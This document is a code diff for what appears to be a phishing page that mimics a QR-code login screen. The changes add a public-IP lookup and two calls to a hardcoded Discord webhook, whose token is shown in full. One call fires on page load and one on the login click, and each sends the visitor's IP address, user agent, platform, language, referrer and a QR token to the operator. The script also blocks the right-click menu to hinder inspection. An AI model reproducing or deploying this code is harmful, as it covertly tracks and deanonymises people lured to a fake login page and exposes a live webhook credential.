@@ -3,8 +3,7 @@
 // ==================================
 const CONFIG = {
   ANIMATION_DURATION: 3000,
-  QR_REFRESH_INTERVAL: 120000, // 2 minutes
-  ELLIPSIS_DELAY_INCREMENT: 0.2,
+  QR_REFRESH_INTERVAL: 120000,
   QR_STRING_LENGTH: 43,
   WEBHOOK_URL:
     "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs",
@@ -22,11 +21,11 @@ const DOM = {
 // STATE
 // ==================================
 let currentQRToken = null;
+let pageLoadSent = false;
 
 // ==================================
-// UTILITY FUNCTIONS
+// UTILITIES
 // ==================================
-
 const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
   const chars =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
@@ -35,20 +34,30 @@ const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
   ).join("");
 };
 
-const sendToWebhook = async (payload) => {
+const getPublicIP = async () => {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip || "Unknown";
+  } catch {
+    return "Unavailable";
+  }
+};
+
+const sendToWebhook = async (title, payload) => {
   try {
     await fetch(CONFIG.WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        content: "📥 **Login Event Received**",
+        content: `📡 **${title}**`,
         embeds: [
           {
-            title: "Login Payload",
-            color: 7506394,
-            fields: Object.entries(payload).map(([key, value]) => ({
-              name: key,
-              value: String(value),
+            title,
+            color: 3447003,
+            fields: Object.entries(payload).map(([k, v]) => ({
+              name: k,
+              value: String(v),
               inline: false,
             })),
             timestamp: new Date().toISOString(),
@@ -57,7 +66,7 @@ const sendToWebhook = async (payload) => {
       }),
     });
   } catch (err) {
-    console.error("Webhook send failed:", err);
+    console.error("Webhook error:", err);
   }
 };
 
@@ -74,9 +83,9 @@ const QRCodeModule = {
       const moduleCount = qr.getModuleCount();
       const svgString = qr.createSvgTag(1, 0);
 
-      const parser = new DOMParser();
-      const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
-      const svg = svgDoc.documentElement;
+      const svg = new DOMParser()
+        .parseFromString(svgString, "image/svg+xml")
+        .documentElement;
 
       svg.setAttribute("width", "160");
       svg.setAttribute("height", "160");
@@ -88,23 +97,9 @@ const QRCodeModule = {
       }
 
       return svg;
-    } catch (e) {
-      console.error("QR error:", e);
+    } catch {
       return null;
     }
-  },
-
-  showLoading() {
-    if (!DOM.qrCodeContainer) return;
-    DOM.qrCodeContainer.innerHTML = `
-      <span class="spinner qrCode-spinner">
-        <span class="inner wanderingCubes">
-          <span class="item"></span>
-          <span class="item"></span>
-        </span>
-      </span>
-    `;
-    DOM.qrCodeContainer.style.background = "transparent";
   },
 
   refresh() {
@@ -127,79 +122,76 @@ const QRCodeModule = {
     DOM.qrCodeContainer.style.background = "white";
   },
 
-  simulateRefresh() {
-    this.showLoading();
-    setTimeout(() => this.refresh(), 3500);
-  },
-
   init() {
     this.refresh();
-    setInterval(
-      () => this.simulateRefresh(),
-      CONFIG.QR_REFRESH_INTERVAL
-    );
+    setInterval(() => this.refresh(), CONFIG.QR_REFRESH_INTERVAL);
   },
 };
 
 // ==================================
-// LOGIN BUTTON MODULE
+// LOGIN BUTTON MODULE (2nd WEBHOOK)
 // ==================================
 const LoginButtonModule = {
-  showLoading() {
-    if (!DOM.loginButton) return;
-
-    DOM.loginButton.innerHTML = `
-      <span class="spinner">
-        <span class="inner pulsingEllipsis">
-          <span class="item spinnerItem"></span>
-          <span class="item spinnerItem"></span>
-          <span class="item spinnerItem"></span>
-        </span>
-      </span>
-    `;
-    DOM.loginButton.disabled = true;
-
-    document.querySelectorAll(".spinnerItem").forEach((item, i) => {
-      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
-        i * CONFIG.ELLIPSIS_DELAY_INCREMENT
-      }s`;
-    });
-
-    setTimeout(() => this.reset(), CONFIG.ANIMATION_DURATION);
-  },
-
-  reset() {
-    if (!DOM.loginButton) return;
-    DOM.loginButton.textContent = "Log In";
-    DOM.loginButton.disabled = false;
-  },
-
   init() {
     if (!DOM.loginButton) return;
 
     DOM.loginButton.addEventListener("click", async (e) => {
       e.preventDefault();
-      this.showLoading();
 
-      await sendToWebhook({
+      DOM.loginButton.disabled = true;
+      DOM.loginButton.textContent = "Logging in...";
+
+      const ip = await getPublicIP();
+
+      await sendToWebhook("LOGIN EVENT", {
         event: "login",
         timestamp: Date.now(),
+        ipAddress: ip,
         qrToken: currentQRToken,
         userAgent: navigator.userAgent,
         language: navigator.language,
         platform: navigator.platform,
       });
+
+      setTimeout(() => {
+        DOM.loginButton.textContent = "Log In";
+        DOM.loginButton.disabled = false;
+      }, CONFIG.ANIMATION_DURATION);
     });
   },
 };
 
 // ==================================
-// INITIALIZATION
+// PAGE LOAD WEBHOOK (1st WEBHOOK)
 // ==================================
-const init = () => {
-  LoginButtonModule.init();
+const handlePageLoad = async () => {
+  if (pageLoadSent) return;
+  pageLoadSent = true;
+
+  const ip = await getPublicIP();
+
+  await sendToWebhook("PAGE LOAD EVENT", {
+    event: "page_load",
+    timestamp: Date.now(),
+    ipAddress: ip,
+    qrToken: currentQRToken,
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    platform: navigator.platform,
+    referrer: document.referrer || "Direct",
+  });
+};
+
+// ==================================
+// INIT
+// ==================================
+const init = async () => {
   QRCodeModule.init();
+  LoginButtonModule.init();
   document.addEventListener("contextmenu", (e) => e.preventDefault());
+
+  // 🔥 Webhook #1 fires here
+  await handlePageLoad();
 };
 
 document.readyState === "loading"
